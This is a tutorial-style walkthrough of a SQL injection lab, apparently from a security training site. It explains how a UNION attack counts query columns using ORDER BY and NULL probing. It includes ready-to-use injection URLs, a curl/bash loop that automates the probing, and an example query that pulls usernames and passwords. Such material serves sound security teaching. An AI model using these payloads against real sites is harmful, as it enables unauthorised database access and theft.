UNION Attack — Count the Columns

UNION is the cheat code for SQLi. It lets you glue YOUR query onto the developer's query.
But first, you need to know how many columns the original returns. That's this lab.

"Before you dump the database, you gotta count to N."

Chapter 01 // Refresher

🧠 What even IS a UNION attack?

UNION is a legit SQL keyword that stacks the results of two SELECT statements into one big result set.

SELECT name, price FROM products UNION SELECT username, password FROM users

The DB runs the first SELECT, then runs the second SELECT, and returns them as one table. This is how you exfiltrate data through a SQLi — you inject a second SELECT that pulls data from a table the developer never intended to show you.

📝 The shared-tray rule

Imagine the DB is a cafeteria server. The first SELECT is "I'll have 2 items: a sandwich and a price tag." So the DB grabs a tray with 2 slots.

If you try to UNION something that returns 3 items (username, password, email), the DB freaks out: "I've already committed to a 2-slot tray, I can't fit 3 things!" → ERROR.

So your UNION SELECT must return EXACTLY the same number of columns as the original. That's why we have to count first.

🔑 Two rules of UNION attacks

Rule 1 — column count must match

The injected SELECT must return the same number of columns as the original. Mismatch = SQL error = no data.

Rule 2 — column types must be compatible

(We'll tackle this in a future lab.) Each column's data type must be compatible in the same slot. Today we only solve Rule 1.

🧠 Brain Power
The original query is SELECT * FROM products WHERE category = 'Gifts'. Assume products has 8 columns. How many columns must my UNION SELECT have?

8. Exactly matching. Because SELECT * unfolds to all 8 columns, and UNION requires matching column counts, your injected SELECT must return 8 values too.

This is what this lab is teaching: a systematic way to discover that number without guessing blind.

Chapter 04 // The Guided Solve

🛠️ Two techniques. Use either.

There are two classic ways to find the column count. We'll cover both because different real-world apps react differently.

🅰️ Technique A: ORDER BY N probing

Click any category, grab the URL browser

You get:

🔒 https://YOUR_LAB/filter?category=Gifts
Why: same injection point as Lab 1. The category parameter goes straight into a WHERE clause.

Inject ORDER BY 1 browser

Paste into the URL:

🔒 https://YOUR_LAB/filter?category=Gifts'+ORDER+BY+1--

(Using + for spaces, URL-encoded.) Page loads normally. That tells you "yes, the query has at least 1 column."

Why ORDER BY: it accepts a column position (1, 2, 3…). If you ask it to sort by column 9 and there are only 8, the DB throws an error. That's our oracle.

Increment until it breaks browser

Try ORDER BY 2, ORDER BY 3… one at a time:

browser · request log
?category=Gifts'+ORDER+BY+1-- → 200 OK (products render) ?category=Gifts'+ORDER+BY+2-- → 200 OK ?category=Gifts'+ORDER+BY+3-- → 200 OK ?category=Gifts'+ORDER+BY+4-- → 500 Internal Server Error

3 works, 4 errors. So the query has 3 columns.

Why this is beautiful: no guesswork. You climb the staircase one step at a time until it collapses — the last safe step is your answer.

🅱️ Technique B: UNION SELECT NULL probing

Inject increasing numbers of NULLs browser

Try one NULL:

🔒 https://YOUR_LAB/filter?category=Gifts'+UNION+SELECT+NULL--

Then two:

?category=Gifts'+UNION+SELECT+NULL,NULL--

Then three:

?category=Gifts'+UNION+SELECT+NULL,NULL,NULL--

The one that doesn't error is the correct column count. In this lab: 3 NULLs works. Lab solves.

Why NULL: it's compatible with every data type. So you sidestep Rule 2 (type mismatch) entirely and only test Rule 1 (count).

(Bonus) Automate the count with curl shell

Why try one at a time when bash can brute-force in 2 seconds?

bash · ~/labs
$ LAB="https://YOUR_LAB" for n in 1 2 3 4 5 6 7 8; do nulls=$(printf 'NULL,%.0s' $(seq 1 $n) | sed 's/,$//') code=$(curl -s -o /dev/null -w "%{http_code}" \ "$LAB/filter?category=Gifts%27%20UNION%20SELECT%20$nulls--%20") echo "$n cols -> HTTP $code" done 1 cols -> HTTP 500 2 cols -> HTTP 500 3 cols -> HTTP 200 4 cols -> HTTP 500 5 cols -> HTTP 500 ...

HTTP 200 on column count 3 = answer. Clean, reproducible, paste-able into a bounty report.

Why automate: real targets may have 20+ columns. A bash loop scales linearly; manual URL edits do not.

Chapter 05 // Payload Dissected

🔬 Anatomy of the winning URL

?category=Gifts' UNION SELECT NULL,NULL,NULL--

Gifts'

Completes the original WHERE condition + closes the string. Same trick as Lab 1.

UNION SELECT

Glues a new query onto the original. The DB returns both result sets stacked.

NULL,NULL,NULL

3 NULLs = 3 columns. Matches the original's column count. Compatible with any data type.

--

Comments out anything left after our injection (like an ORDER BY or more conditions the dev added).

URL encoding

Spaces become + or %20. Apostrophes can be %27 or left raw (browser tolerates both).

The error code

500 = wrong column count. 200 = you found it. Your signal-to-noise ratio.

💡 Why this lab matters so much: every future UNION-based SQLi lab starts with "first, count the columns." You just learned the foundational step that unlocks all of UNION-based data exfiltration.

Chapter 06 // Real-world

💰 UNION attacks in the wild

🗞️ Classic news sites, forums, e-commerce

Older PHP/MySQL apps are full of UNION-SQLi. Entire databases have been dumped over the years using this exact technique. Every major breach of the 2010s that started with SQLi used some variant of UNION or Blind SQLi.

🛠️ sqlmap automates this

The famous tool sqlmap does what you just did — automatically. Under the hood, its first move on a UNION-capable injection is: count columns via ORDER BY or NULL probing. Now you know why.

Chapter 07 // Retention Quiz

🎯 Did it stick?

🧠 Why do we use NULL in UNION probes instead of 'a' or 1?

Think about the two UNION rules.
Because NULL is shorter to type
Because NULL is compatible with every column data type, so type mismatches don't confuse our column-count results
Because NULL is always true in SQL
Because NULL bypasses WAFs

🧠 You try UNION SELECT NULL,NULL and get 500. Then UNION SELECT NULL,NULL,NULL and get 200. What do you now know?

Be precise.
The database is MySQL
The original query returns 3 columns
The admin password is 3 characters long
The table has 3 rows
